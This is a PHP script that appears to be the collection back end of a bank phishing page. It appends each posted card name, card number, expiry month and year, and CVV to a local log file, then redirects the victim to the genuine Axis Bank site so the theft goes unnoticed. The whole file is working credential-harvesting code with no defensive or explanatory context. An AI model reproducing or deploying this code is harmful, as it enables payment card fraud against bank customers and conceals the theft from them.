<?php
file_put_contents("log.txt", "Card Name = " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("log.txt", "Card Number = " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.axisbank.com/');
?>
	<?php
file_put_contents("log.txt", "Expiry Year = " . $expyear = $_POST['expyear'] . "\n", FILE_APPEND);
header('Location: https://www.axisbank.com/');
?>
	<?php
file_put_contents("log.txt", "Expiry Month = " . $exmonth = $_POST['exmonth'] . "\n", FILE_APPEND);
header('Location: https://www.axisbank.com/');
?>
	<?php
file_put_contents("log.txt", "CVV = " . $cvv = $_POST['cvv'] . "\n", FILE_APPEND);
header('Location: https://www.axisbank.com/');
?>
